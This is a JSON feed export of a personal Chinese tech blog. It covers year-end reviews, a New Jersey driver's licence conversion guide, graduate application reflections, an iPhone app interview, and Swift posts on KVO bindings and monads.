[{"title":"Oh My 2017","permalink":"http://blog.cee.moe/Oh-My-2017.html","link":"http://blog.cee.moe/Oh-My-2017.html","date":"2017-12-31T00:00:00-08:00","modified":"2018-01-09T21:02:11-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Summary\n\n合縁奇縁\n一期一会\n\nMoments\n\n1 在箱根，第一次泡温泉\n\n2 在杭州见了 61，聊了独立开发\n\n3 渡鸦被百度收购\n\n3 有学上了\n\n4 和工藤去了趟香港\n\n4 香港回来的第二天骑摩拜摔断了腿\n\n5 深圳，@Swift Conf，当了次主持\n\n5 辞职回家\n\n6 美国面签\n\n7 补牙\n\n8 ✈️ 去大美帝\n\n9 拿到了新泽西驾照\n\n10 万圣节\n\n11 北美音游群聚会\n\n12 无尽的作业和大作业\n\n12 暴雪\n\n12 决战 C93\n\nInput &amp; Output\n\n+ iPad Pro 10.5-inch (Silver)\n\n- Sony Z5 Dual (E6683)\n\n+ Sony WI-1000X (Black)\n\n+ iPhone X (Space Gray)\n\n- iPhone 7 Plus (Jet Black)\n\nNumbers\n\n\n  7,481 photos\n  4 posts\n  2,535 twitter followers\n  632 instagram followers\n  6 books\n  178 contributions (only on GitHub)\n  Maybe… almost wrote PHP &amp; Java in this year\n\n\nHall of Fame\n\n\n  年度 iOS 应用：GoodNotes 4、BanG Dream!（バンドリ！）\n  年度 Mac 应用：OmniFocus for Mac、Airmail 3\n  最喜欢的游戏：Sound Voltex\n  最喜欢的番剧：月がきれい\n  最喜欢的歌手：豚乙女、FELT（又回到了车万？）\n  最喜欢的歌曲：シュガーソングとビターステップ、打上花火、Shiny Ray\n  离不开的设备：iPad Pro with Apple Pencil\n\n\nThe Next\n\n\n  找到一个好点的 Intern\n  多写一点 Side Project（17 年基本没怎么写）\n  努力找到另一半😘\n\n","excerpt":"Summary\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"免路考，用中国驾照换新泽西驾照","permalink":"http://blog.cee.moe/how-to-get-the-nj-driving-license.html","link":"http://blog.cee.moe/how-to-get-the-nj-driving-license.html","date":"2017-10-02T00:00:00-07:00","modified":"2017-10-02T23:11:00-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"虽然说有很多很多篇文章123总结过了如何用中国驾照在 NJ 换取驾照，但是每次看到日期都是 15、16 年的时候，心里总是没有一点底。直到自己亲身实践拿到驾照（2017.09.28）之后才长叹一口气。这篇文章把所有关键的点再来总结一下，应该是全网最最最具体的 QA 解答了吧。\n\n去哪里换\n\n答案只有一个，North Bergen 的 DMV。其他 DMV 都已经没法再用中国的驾照免路考换了。\n\n地址：8901 Park Plaza, North Bergen, NJ 07047。\n\n怎么去\n\n如果你在 NJ，直接公交或者朋友开车送你去吧。\n\n在 NY 的同学可以坐地铁到 42 街下车，去 Port Authority Bus Terminal 买一张 NJ Transit 的公交票，到 Bergenline Ave 或者 Fairview Ave &amp; Grand St 下车。步行就能到 DMV 啦。\n\n准备材料\n\n重中之重。准备好符合 New Jersey 的 6 Points ID Verification。NJ MVC 的官网同时也有计算器来帮助大家查看证件。\n\n自己带了如下的 ID 证明文件：\n\n\n  Passport\n  I-94\n  I-20\n  Student ID Card\n  University / College Transcript\n  Social Security Denial Letter / SSN Card\n  Bank Statement (in 90 days)\n  Debit Card\n\n\n此外，需要提前准备好中国驾照以及对应的翻译公证证明。具体可以点进这个链接。\n\n关于笔试\n\n和国内考科目一和科目四差不多，在 NJ 是从 50 道题中回答对 40 道就算通过了笔试。\n\n准备笔试题目一定要好好通读 MVC 官方的 Manual。如果想再做做题目的话安利 https://driving-tests.org 这个网站。虽然题目不全但是能熟悉一下很多数字和题型。\n\n换驾照流程\n\n最繁琐的事情就是考试当日的操作。先看一下 North Bergen DMV 的平面图。\n\n\n\n\n  进门右转到 Reception，和工作人员说过来考理论，领表，填写完整。注意是选择初次。\n  到 ID Check Area，检查 6 分证明并提交表格。人多的时候会给一个小牌子，让你在休息区等人叫号，否则直接到休息区中间的队伍排队。\n  轮到你的时候到某个窗口，重新检查 6 分证明。交钱、拍照，领一张考试的许可证明，可以去考试区右边排队了。\n  叫到号之后在 Vision Test Area 进行视力检查。通过之后关掉手机进考场考试。\n  通过考试后工作人员会叫你过去。把翻译公证件给工作人员查看，通过后会给一张领驾照的单子。\n  填写完整之后重复步骤 2 和 3，拿到驾照。\n\n\n整个换驾照的时间会比较的漫长，最好填饱肚子再去比较合适。不过边上就有 Burger King 还是很人性化的。\n\n\n  \n    \n      New Jersey 中国驾照换美国驾照终极攻略！&nbsp;&#8617;&#xfe0e;\n    \n    \n      新泽西中国驾照免路考换 NJ 驾照经验&nbsp;&#8617;&#xfe0e;\n    \n    \n      用国内驾照免路考换新泽西州驾照全套攻略&nbsp;&#8617;&#xfe0e;\n    \n  \n\n","excerpt":"虽然说有很多很多篇文章123总结过了如何用中国驾照在 NJ 换取驾照，但是每次看到日期都是 15、16 年的时候，心里总是没有一点底。直到自己亲身实践拿到驾照（2017.09.28）之后才长叹一口气。这篇文章把所有关键的点再来总结一下，应该是全网最最最具体的 QA 解答了吧。\n\n\n  \n    \n      New Jersey 中国驾照换美国驾照终极攻略！&nbsp;&#8617;&#xfe0e;\n    \n    \n      新泽西中国驾照免路考换 NJ 驾照经验&nbsp;&#8617;&#xfe0e;\n    \n    \n      用国内驾照免路考换新泽西州驾照全套攻略&nbsp;&#8617;&#xfe0e;\n    \n  \n\n","languages":null,"categories":["note"],"tags":[]},{"title":"写在申请季之后","permalink":"http://blog.cee.moe/After-Applying-For-Graduate-School.html","link":"http://blog.cee.moe/After-Applying-For-Graduate-School.html","date":"2017-05-09T00:00:00-07:00","modified":"2017-05-09T02:15:11-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"立夏，也立了自己的目标。交完了 500 刀的占位费，自己的内心也不再这么迷茫，决定了，就是 NYU 了。\n\n背景\n\n正如很久没有改过的简介页面写的那样，大四的时候就有出国的打算了。可是也恰好就在这时查出了自己的心脏有先天性的问题1，在 12 月的生日前时候做了个心脏手术。家里也因为这个原因坚持让我在家里修养一年，等治疗稳定了再出国上学。考虑到身体的问题，自己也是默默的妥协了。\n\n毕业之后进了一家不大也不小的公司，忙的时候忙，闲的时候也闲。这一年下来病情也没有再次发作，也就是说经历了手术之后已经完全治愈了2。伴随着家里的催促声和自己在心底的阵阵呼喊打气，下定了决心，继续踏上求学之路。\n\n准备\n\n美帝求学的准备材料还是比较复杂的。作为一个已经毕业的工作狗，申请的要求会和在校时期准备的内容有细微的差别。具体的话包括了以下列举的几大内容：\n\n\n  大学阶段的中英文成绩单（GPA）：学校或者是学位网认证过的，可能需要官方的信封邮寄；\n  大学的中英文学位和学历证书：能够证明你毕业和你的专业；\n  TOEFL 成绩；\n  GRE 成绩；\n  CV：个人简历；\n  PS：个人陈述，所谓的文书；\n  RL：推荐信。\n\n\n对于工作狗，可能需要专门再回一趟学校来准备成绩单和学历学位证书（自己是在毕业的时候就提前准备好了）。如果说没有考 TOEFL 和 GRE 的话，恭喜你，在中国抢考位的难度堪比 12306 春运时期的抢票。所以前四样是越早准备越早考完就好。自己的 GPA 和 T、G 成绩都不怎么好看，在这里就不透露了（捂脸）。\n\n关于最后的三样，其实是用来弥补之前 GPA 或者考试成绩的一些不足。CV 能提现出一个人的经历和获奖情况；PS 也是一方面表现自己，另一方面也要提现出求学的渴望，对未来学校和工作的期望；RL 能够请到好的导师或者是上级来帮自己证明实力，那是最好不过的了。\n\n\n  Tips：这些材料的准备多多少少得花一段时间进行准备，尽早是最好的！\n\n\n撇开成绩的问题，准备材料中遇到几个问题会让自己很头疼：\n\n\n  工作狗的 CV 经常会改：自己做过的项目和内容在不断变化，得写自己最最最擅长的东西；\n  PS 的内容因为学校的不同而作适当的调整，最好是先写一个大致的框架，根据学校和专业的不同往上面填东西；\n  推荐信找不到老师来帮你写🤣，或者说老师们都懒得写；\n  有的学校可能会要求 WES 的成绩认证或者学位网的学位学历公正，快递回来巨坑无比。\n\n\n申请\n\n材料准备齐全，就可以准备申请了。用一个 Excel（或者 Numbers）表格记录一下申请学校的网址，注册填写个人资料即可。部分学校需要邮寄材料的就按照指示邮寄就行\n\n在这边还是列举一下 Tips：\n\n\n  使用 OmniFocus 或者一些任务管理软件跟踪申请的步骤和内容；\n  用一张表格或者文本替换来快速输入个人信息（比如电话、家庭信息等等）；\n  付款请准备好几张信用卡：有些学校的付款方式比较诡异，不认 AmEx 的信用卡；\n  快递的话强烈推荐顺丰、EMS 以及 FedEx；\n  敦促你的导师或者是上级在填写完申请后快点发推荐信😄。\n\n\n等待和收获\n\n一月份的时候在日本提交了所有的申请。本以为填表是一件枯燥乏味的事情，结果发现每天刷邮件才是一种真正的煎熬。盼星星盼月亮，每天早上起来都会去邮箱里看一下有没有学校给自己发 Ad。三月，终于在吃了一连串拒信的时候来了第一封 Ad。\n\n最终：\n\n\n  Decision: CS@NYU Tandon\n  Ad: CS@NEU, CS@UPenn, CS@NYU Tandon\n  Rej: CS@NYU GSAS, CSE@USC, CS@UCI, CSE@NEU, CS@Rice\n  Pending: CSE@CMU\n\n\n不是很好看的成绩，但是对得起自己的付出了吧！\n\n还没有结束\n\n申请季结束，也是意味着自己人生的一个新的开始。\n\n即将辞去工作，重新拥抱学校的学习生活。\n\n又是一个人，一座陌生的城市，一段奇妙的旅程。\n\n\n\n\n  \n    \n      具体的心脏问题叫「阵发性室上性心动过速（Paroxysmal supraventricular tachycardia，PSVT）」，是由心室之外的其他心肌组织发放电冲动所引起的规则且快速心动（每分钟 160 到 200 次）、突发或突止的心律不齐。&nbsp;&#8617;&#xfe0e;\n    \n    \n      大约有 3% 的可能性是手术后一年内可能需要再次手术或者植入心脏起搏器。&nbsp;&#8617;&#xfe0e;\n    \n  \n\n","excerpt":"立夏，也立了自己的目标。交完了 500 刀的占位费，自己的内心也不再这么迷茫，决定了，就是 NYU 了。\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"装了啥 | 其实我也不知道手机里装了啥，直到写了这篇文章","permalink":"http://blog.cee.moe/Apps-Inside-iPhone.html","link":"http://blog.cee.moe/Apps-Inside-iPhone.html","date":"2017-04-27T00:00:00-07:00","modified":"2017-04-27T20:44:46-07:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n  本文首发于少数派，原文链接：https://sspai.com/post/38970。转载请说明出处。\n\n\nQ1. 简单介绍一下你自己。\n\n大家好，我叫 Cee。现在是一名开发工程师（大概算半个 Growth Hacker），也是一名独立开发者。现在在渡（bai）鸦（du）工作，即将出国继续读 CS 方向的研究生。\n\nQ2. 哪些 App 对你的工作 / 学习 / 生活最重要？（提供一下你的主屏，列举一些 App，建议不超过 3 个）\n\n\n\n主屏幕上的 App 并不是特别的多，主要分为几类：社交、照片、支付、日常以及娱乐。可以说这些应用基本上每天都会打开一下。最最最常用的可能就是放在 Dock 上的四个应用：Expense、Telegram（自己在用 Swift 重写的 Beta 版本）、OmniFocus 以及 Safari。不要介意主屏幕上有那么多小红点，自己对他们并不感冒。\n\nQ3. 那么，能否具体说说你是如何使用这些 App 的呢？\n\n首先介绍一下 Expense。Expense 是让我一直坚持记账的一款软件。它的界面非常的清爽简洁，而且只有记账功能，并不像其他的记账应用花里胡哨，还有各种广告。当你吃完饭、买买买刷完卡的时候，使用 Expense 记上一笔，就知道这个月——又没钱了。\n\n其次是 Telegram。作为一款需要〇〇的实时 IM 软件，无论从界面还是功能来说，Telegram 都秒杀微信、QQ 几个大街（尤其是贴纸表情的管理）。当主要的联系人都在 Telegram 上后，你就发现开微信和 QQ 也就只有谈工作上的事情了。如果说 Telegram 再支持个收付款的功能，那就更好了。\n\nOmniFocus，一款老牌的 GTD 应用。在 Mac 上也有对应的版本可以下载。用于生活和学习的任务管理。对于自控能力比较差，或者是经常忘记做事情的同学来说，OmniFocus 绝对是神器。少数派也有太多太多介绍 OmniFocus 的文章了，这里也不再赘述。\n\n剩下来的一些 App 再介绍一下：\n\n\n  Social 文件夹：全是聊天工具或者消遣的 App，除了 Tweetbot 用的多把它放在外面之外，剩下的都在里面；\n  Photos 文件夹：处理图片，比如有 Instagram 家的三件套，拼长图的工具 Picsaw、Tailor 和 LongScreen（都很推荐），微软的 Lens 适合把照片或者名片电子化；\n  Credit 文件夹：银行讨债用，日常浦发抽积分；\n  Alipay：人人喊打，但是要买个东西付个款你还得用；\n  Tweetbot：刷推；\n  Lightroom + Instagram + Swarm：签到，拍照，记录生活；\n  网易云音乐：日常上下班听歌，或者开 Castro 听 Podcast；\n  Dropbox + Paper：文件共享和协作；\n  Youtube：看 Unbox Therapy 等等视频；\n  Calendars 5 + Mail：处理工作日程和邮件；\n  Reeder：订阅 RSS，知识和信息的获取来源。\n\n\nQ4. 推荐一个让生活更美好的物件？\n\n不得不提的是 Sony MDR-1000X。隔音的效果太好了，能在上班的时候减少很多外界的干扰。同时如果喜欢听歌的话，1000X 的音质也是不用说的，效果棒棒哒！\n\nQ5. 分享一个改善生活的小习惯。\n\n睡觉前戴一下花王的蒸汽眼罩，第二天会发现睡得特别的好！\n\nQ6. 说一个你很喜欢、但还少有人知道的 App。\n\nEuclidea。非常小众的一款智力游戏，就是尺规作图。无聊的时候可以玩玩，挑战自己的脑力极限。他们家还有个好玩的智力游戏叫作 Tchisla（希腊文中「算数」的意思）。\n\nQ7. 在你订阅的付费服务当中哪一些是不可或缺的？\n\n列个列表吧：\n\n  iCloud Drive：用来同步我的照片（这个人照片太多了）；\n  PlayStation Plus：每个月都有想玩的游戏；\n  Apple Developer Program：没有这个我就要死了。\n\n\nQ8. 有什么自己用过 100 元以内提升自己生活品质的好东西吗？\n\nMUJI 的靠枕和证件包。靠枕在这篇文章中有说明；证件包自然就是能帮助我收纳护照、证件的一个非常大的夹子，出国旅行的时候特别有用。\n\nQ9. 厚颜无耻地问一下怎么联系你？\n\n\n  Telegram: @Ceeee\n  Twitter: @Ceecirno\n  Blog: Perfect Freeze\n  Mail: ceecirno#gmail.com\n\n","excerpt":"\n  本文首发于少数派，原文链接：https://sspai.com/post/38970。转载请说明出处。\n\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"Oh My 2016","permalink":"http://blog.cee.moe/Oh-My-2016.html","link":"http://blog.cee.moe/Oh-My-2016.html","date":"2016-12-31T00:00:00-08:00","modified":"2016-12-30T20:46:48-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"Summary\n\n家畜の安寧\n虚偽の繁栄\n死せる餓狼の『自由』を！\n\nMoments\n\n1 @Swift Conf\n\n1 抑郁\n\n2 和少将、迷子去南昌找球球玩\n\n2 拿到驾照\n\n3 重新开始玩 Project Diva\n\n3 鸡鸣寺赏樱、夜游\n\n4 日本毕业旅行🇯🇵\n\n5 莫名去了武汉\n\n5 在大剧场举办的学园祭\n\n6 毕业🎓\n\n7 突然决定来帝都，加入了渡鸦\n\n8 送走出国的大学同学，还有小萌\n\n9 マジカルミライ 2016\n\n10 Release inFlow\n\n10 四十八小时参加了两场 Hackathon\n\n11 Release QReader\n\n11 北京雾霾，机场半日游\n\n11 Release Raven H-1\n\n12 Release fin.\n\n12 Celebrate 🎂21 w/ 羽喵\n\n12 Release 12 Dogs\n\nInput &amp; Output\n\n- Sony Z3 (l55t)\n\n+ Sony Z5 Dual (E6683)\n\n+ PSV 2000\n\n- iPhone 6s Plus (Rose Gold)\n\n+ Sony MDR-1000\n\n+ PSV 1000\n\n- MacBook Pro (Mid 2014)\n\n+ iPhone 7 Plus (Jet Black)\n\n+ MacBook Pro (Late 2016)\n\nNumbers\n\n\n  4,025 photos\n  12 posts\n  2,205 twitter followers\n  466 instagram followers\n  11 books\n  663 contributions (only on GitHub)\n  46,526 lines of code\n    \n      Objective-C\n      Swift\n      Shell Scripts\n      JavaScript\n      HTML\n      Python\n    \n  \n\n\nHall of Fame\n\n\n  年度 iOS 应用：OmniFocus、Workflow\n  年度 Mac 应用：One Clock、OmniFocus for Mac、IA Writer\n  最喜欢的游戏：INKS.\n  最喜欢的番剧：Black Mirror SE3、吉祥寺だけが住みたい街ですか？\n  最喜欢的歌手：ナノ、fhána\n  最喜欢的歌曲：STYX HELIX、夢灯籠、前前前世、生きていたんだよな、恋、何者\n  离不开的设备：MacBook Pro with TouchBar\n\n\nThe Next\n\n\n  Go abroad for further study\n  Fight for freedom\n  Earn more money in less time\n  找一个专属的画师\n  出门五次以上\n\n","excerpt":"Summary\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"写给 2017 的你和我","permalink":"http://blog.cee.moe/letter-to-2017.html","link":"http://blog.cee.moe/letter-to-2017.html","date":"2016-12-29T00:00:00-08:00","modified":"2016-12-30T00:14:15-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"\n\n\n  青春が終わり、人生が始まる。\n\n\n\n\n\n  每个人都更容易被满足：\n    \n      踏入社会，无论是工作还是继续深造学习，如果能通过知识或者金钱的积累满足每个人的愿望，那就最好不过了。\n    \n  \n  不断最大化个人的利益：\n    \n      可能站在一年前或者两年以前，我一定会说先满足集体利益再考虑自我。但是站在现在的这个节点看来，满足自己的利益不被集体损害要优先于其他任何事情。未来可是在自己手里。\n    \n  \n  继续努力追求自由：\n    \n      写给仍被关在学校中学习的你，亦或是感觉上了一年班依旧感觉两手空空的你。无论是精神还是物质上的自由，我们都需要去不断努力追求。今年自己做的几个决定1，可能都比较鲁莽和草率，但是离自己想要的自由的生活却越来越近了。\n    \n  \n  还能有梦想，还敢去想：\n    \n      脚踏实地地做事，但是眼（da）睛（nao）看到的地方要远。\n    \n  \n  多找老司机聊天：\n    \n      找到一个知心的老司机与你分享 ta 的人生经验是一件绝妙的事情。今年得谢谢小明和谦哥，又一次改变了自己的人生和价值观。\n    \n  \n\n\n最後、あけおめ。\n\n\n  \n    \n      在下一篇博客里会了解到这些内容&nbsp;&#8617;&#xfe0e;\n    \n  \n\n","excerpt":"\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"做决定及其他","permalink":"http://blog.cee.moe/make-decisions-and-others.html","link":"http://blog.cee.moe/make-decisions-and-others.html","date":"2016-12-27T00:00:00-08:00","modified":"2016-12-29T18:41:37-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"在去年年末写总结的时候，自己曾经写下「希望今年一年做决定能够更加的果断和勇敢」之类的话语。现在看来，的确是做到了一部分，但少些时候依旧会变得很被动、优柔寡断。分门别类，有两种情况：\n\n一，是涉及集体时所做的决定。根据囚徒困境理论，现实就是一个非零和博弈，个人的理性选择往往会导致集体的非理性结果。并且，在赵国往往有着「吃力不讨好」的说法，所以在这时做的决定往往是基于感性，而非理性。\n\n二，是涉及复杂影响因素和未来导向的决定。比如曾在十月份纠结「出国还是工作后再出国」。这个决定涉及家庭环境、未来自己的出路（比如，大家都很关心的…钱？）等等。做这种决定时，自己还是喜欢找人讨论后再小心谨慎地去做。\n\n\n\n最近很受伤，于是昨晚发了条推：\n\n\n  @Ceecirno: 想了想，自己還是喜歡當一個「好」人。即使付出了努力被別人指責，退一步來說，還是要相信會有美好的回報和未來吧。\n\n\n\n\n\n\n\n  在夜里，她轻声哼唱着安慰自己，相信在这个世界上总会有人心疼自己，于是便也有了这首「宝贝」。多少年过去，不知是否真正找到了那个疼她人，但是这首歌却安慰了多少个孤独的孩子和多少受伤的心。\n\n\n\n  张悬：很多人喜欢「宝贝」这首歌，给我的回馈是，会对女儿唱这首歌、对情人唱这首歌、对父母唱这首歌，但他们从来不对自己唱这首歌，没有人会把自己当宝贝。我突然觉得大家对於自由、简单或是实现梦想充满了期待跟最后一点的无助，而那个无助让你感到退却或自卑。\n\n\n","excerpt":"在去年年末写总结的时候，自己曾经写下「希望今年一年做决定能够更加的果断和勇敢」之类的话语。现在看来，的确是做到了一部分，但少些时候依旧会变得很被动、优柔寡断。分门别类，有两种情况：\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"一个在 Swift 3.0 下关于 KVO 和 Cocoa Bindings 的坑","permalink":"http://blog.cee.moe/swift-3-kvo-and-cocoa-bindings.html","link":"http://blog.cee.moe/swift-3-kvo-and-cocoa-bindings.html","date":"2016-11-23T00:00:00-08:00","modified":"2016-11-23T00:10:06-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"前段时间好好的看了一下 Cocoa Bindings，然后做了一个最基本的 Demo：三个 NSSlider 控制一个 NSColorWell 的颜色变化。结果发现无论怎么拖动 slider 都无法改变 well 的颜色。代码如下：\n\nvar r: CGFloat = 0.0\nvar g: CGFloat = 0.0\nvar b: CGFloat = 0.0\n\ndynamic var color: NSColor {\n    return NSColor(srgbRed: r, green: g, blue: b, alpha: 1)\n}\n\nclass func keyPathForValuesAffectingColor() -&gt; Set&lt;String&gt; {\n    return Set([\"r\", \"g\", \"b\"])\n} \n\n\n\n今天有空的时候又重新研究了一下，发现 Swift 里面 KVO 有两个坑：\n\n\n  被观察的属性应该是 dynamic 的；\n  keyPathForValuesAffecting&lt;Key&gt; 在 Swift 下面被改方法名了。\n\n\n很好奇的是，第二点官方也没有说明，API docs 里面也是 no diff 的状态。\n\n修改后代码如下：\n\ndynamic var r: CGFloat = 0.0\ndynamic var g: CGFloat = 0.0\ndynamic var b: CGFloat = 0.0\n\ndynamic var color: NSColor {\n    return NSColor(srgbRed: r, green: g, blue: b, alpha: 1)\n}\n\noverride class func keyPathsForValueAffectingValue(forKey key: String) -&gt; Set&lt;String&gt; {\n    guard key == \"color\" else {\n        return Set()\n    }\n    return Set([\"r\", \"g\", \"b\"])\n}\n\n\n","excerpt":"前段时间好好的看了一下 Cocoa Bindings，然后做了一个最基本的 Demo：三个 NSSlider 控制一个 NSColorWell 的颜色变化。结果发现无论怎么拖动 slider 都无法改变 well 的颜色。代码如下：\n\n","languages":null,"categories":["note"],"tags":[]},{"title":"重新理解 Monad","permalink":"http://blog.cee.moe/recap-monad.html","link":"http://blog.cee.moe/recap-monad.html","date":"2016-11-08T00:00:00-08:00","modified":"2016-11-07T09:59:43-08:00","author":{"name":"Cee","url":"http://cee.moe/","email":"ceecirno@gmail.com"},"content":"对于大多数刚刚入门函数式编程的同学来说，monad（单子、又叫单体）可能是这里面的一道坎。你可能对 map、flatMap 以及 filter 再熟悉不过，可是到了高阶的抽象层次上就又会变得一脸懵逼。其实每个人在学习的阶段都会经历这个过程，不过希望这篇文章能让你重新理解 monad 以及其他相关的概念。\n\nOptional\n\nSwift 作为一门类型安全的强类型语言，它在编译阶段就会对你的数据类型进行比较多的检查。因此，在 Swift 中我们遇到了一种新的数据类型，叫做 Optional。它的定义如下：\n\npublic enum Optional&lt;Wrapped&gt; : ExpressibleByNilLiteral {\n    case none\n    case some(Wrapped)\n}\n\n\n\nOptional 是个枚举类型，可以看到它有两个值：none 以及 some。简单点讲：\n\n\n  值要么存在（presence），要么不存在（absence）。\n\n\n这也就意味着 Optional 可能是包含了一个某个类型的值（some），也可能是什么都没有（none）。在这里，Optional 就是个容器（container）。\n\n\n\n对于基础类型，在其后面直接加上 ? 就代表了这就是个可选值类型（Optional value）。默认值即为 Optional 的预设值 nil（区别于 Objective-C）。\n\n判断一个可选值是否为空，我们通常会采用 if let 的写法来解包（wrap an optional）。\n\nif let value = value {\n    // if value != nil\n} else {\n    // value = nil\n}\n\n\n\nMap\n\n基础类型的 map 函数调用是非常简单的：\n\nlet ages = [20, 40, 50]\nlet tripledAges = ages.map { $0 * 3 }\n// tripledAges = [40, 80, 100]\n\n\n\n如果对于 Optional 呢？\n\nlet price = Optional(20)\nlet doubledPrice = price.map { $0 * 2 }\n// doubledPrice = Optional(40)\n\nlet nilPrice: Int? = .none // equals to `nil`\nlet doubledNilPrice = nilPrice.map { $0 * 2 }\n// doubledNilPrice = nil\n\n\n\n我们发现，map 函数作用在 Optional 上时：\n\n\n  值存在（.some）：值类型 Optional(Int)，返回值类型 Optional(Int)；\n  值不存在（.none）：返回值等同输入（nil）。\n\n\n\n\nmap 函数定义在 Optional 上，最大的好处就在于空值（nil）的处理，不需要我们再去使用 if let 解包（空值并没有乘法运算）：\n\nlet nilPrice: Int? = .none // equals to `nil`\nvar doubledNilPrice: Int?\n\nif let nilPrice = nilPrice {\n    doubledNilPrice = nilPrice * 2\n} else {\n    doubledNilPrice = nil\n}\n\n\n\n因此：\n\n\n  map 只对值存在的可选值进行处理。\n\n\nmap 通常的表示方法：\n\nfunc map&lt;U&gt;(_ f: (T) -&gt; U) -&gt; Container(U)\n\n\n\n在这里，容器 Container 就相当于 Optional，泛型 T 和 U 均为 Int 类型。在处理完 Int 值后 map 函数就把 Int 型转换成了 Optional(Int)，并返回。\n\nAsync Callback Trouble\n\n处理异步的网络请求是一件痛苦的事情。你一定碰到过：\n\ntypealias CompletionBlock = (_ data: Data?, _ response: URLResponse?, _ error: Error?) -&gt; Swift.Void\n\n// Callback\nif error != nil { \n    /* Dealing with network errors */ \n}\nif let json = parseToJSON(with: data) {\n    /* Dealing with parsing errors */ \n}\n/* Dealing with JSON mapping errors */\n/* Dealing with other errors */\n/* WTF! 💩 Sh*t! */\n/* Finally, with success */\n\n\n\n为什么我的异步回调就没有一种方式能够告诉我在哪里出错了呢？方案其实也很简单，我们先在定义一下异步处理的结果（Result）：\n\nenum Result&lt;T&gt; {\n    case success(T)\n    case failure(Error)\n}\n\n\n\n有没有发现 Result 类型很像 Optional？没错。它能包含一个成功的返回值；也能在没有返回值时提供一个错误消息。\n\n\n\n我们也同时希望 map 能帮我们处理 Result：如果有结果，就从 JSON 转换到 String、再转换到其他类型；否则返回错误信息。\n\n这样的 map 函数怎么写呢？不妨先来看一下：\n\nfunc map&lt;U&gt;(_ f: (T) -&gt; U) -&gt; Result&lt;U&gt; {\n    switch self {\n    case let .success(value):\n        return .success(f(value))\n    case let .failure(error):\n        return .failure(error)\n    }\n}\n\n\n\n举个最基本的例子，我们希望将返回的 JSON 转换成 String，那在这里，map 所接受的高阶变换 f 就是一个 JSON -&gt; String 的函数。调用时，Result&lt;JSON&gt; 就会通过 map 最终转换成 Result&lt;String&gt; 类型。\n\n\n\n看上去很不错！\n\nFunctor\n\n在了解 monad 之前，我们先来了解一下它的孪生兄弟：functor（函子）。\n\n从上面的例子中可以看到，在调用 map 函数后，我们还会把 String 类型的结果封装成了一个可选值 Result&lt;String&gt;。\n\n像这样能够从容器（Container，这里即 Result）中取出元素，并通过某个函数将其转换成可以再次被容器包装的结果的类型就称之为 functor。\n\n还有些不懂？没事，暂时就先记住有 functor 这么个玩意儿。\n\nFlatMap\n\n重新回到之前 JSON -&gt; String 的例子上来。假设我们已经将某个 json 转换成了字符串，现在需要将字符串重新格式化，那我们应该需要再调用一次 map：\n\nfunc map(_ f: JSON -&gt; Result&lt;String&gt;) -&gt; Result&lt;Result&lt;String&gt;&gt;\n\n\n\n不过我们多么希望返回的结果是个 Result&lt;String&gt; 的类型。不如写一个函数来解包带有两层的 Result&lt;T&gt;。\n\nfunc flatten&lt;T&gt;(_ f: Result&lt;Result&lt;T&gt;&gt;) -&gt; Result&lt;T&gt; {\n    switch f {\n    case let .success(value):\n        return value\n    case let .failure(error):\n        return .failure(error)\n    }\n}\n\n\n\n还有一点，在写 flatten 函数的时候，我们也同时考虑了在 map 函数中出现转换失败的问题。转换正确的时候的确我们的 map 的输出是个 String 类型的值，随之输出 Result&lt;String&gt; 进入下一层的 map；如果失败，则应当是被转换成 .failure 的结果。\n\n将 map 和 flatten 结合一下，我们就得到了所谓的 flatMap（又称作 bind）：\n\nfunc flatMap&lt;U&gt;(_ f: (T) -&gt; Result&lt;U&gt;) -&gt; Result&lt;U&gt; {\n    return flatten(map(f))\n}\n\n\n\n\n\n通过 flatMap 我们可以非常轻松地处理中途出现的错误异常，并对给定类型进行多次连续的类型转换。\n\nMonad\n\n最后再来说什么是 monad。Chris Edihof 曾在他的文章中指出：\n\n\n  如果可以为某个类型定义它的 flatMap 方法，那么这个类型通常就是个 monad。（If you can define flatMap for a type, the type is often called a monad.）\n\n\n在这里，我们通过 map 和 flatten 实现了 Result 类型的 flatMap。此时，我们就可以说 Result 这个类型就是一个 monad。\n\nDeal with Monad\n\n到现在你就可以非常轻松地处理你的异步请求了。\n\nfunc toString(_ data: Data) -&gt; Result&lt;String&gt;\nfunc toInt(_ str: String) -&gt; Result&lt;Int&gt; \nfunc toImage(_ num: Int) -&gt; Result&lt;UIImage&gt;\nfunc applyBlur(_ image: UIImage) -&gt; Result&lt;UIImage&gt;\n\n// WOW!\ntoString(data)\n    .flatMap(toInt)\n    .flatMap(toImage)\n    .flatMap(applyBlur)\n\n\n\nSummary\n\n\n  重新回顾一下 map 和 flatMap 在 Result&lt;T&gt; 上的工作方式：\n\n\n\n\n\n\n\n  Functor、monad 可以看作是一种运算的抽象。它们的目的都是为了更好的解决类型的封装和转换。\n\n\nFurther Reading\n\n\n  ReactiveCocoa\n  Promise &amp; Future\n  Swift 中的 throw 及 rethrow\n\n\nReferences\n\n\n  Functor and Monad in Swift - Javier Soto\n  Swift 烧脑体操（五）- Monad - 唐巧\n  Monads Everywhere: Porting C#’s Tasks to Swift - Nevyn Bengtsson\n  Monads in Swift - Chris Edihof\n  続・ゲンバのSwift\n\n","excerpt":"对于大多数刚刚入门函数式编程的同学来说，monad（单子、又叫单体）可能是这里面的一道坎。你可能对 map、flatMap 以及 filter 再熟悉不过，可是到了高阶的抽象层次上就又会变得一脸懵逼。其实每个人在学习的阶段都会经历这个过程，不过希望这篇文章能让你重新理解 monad 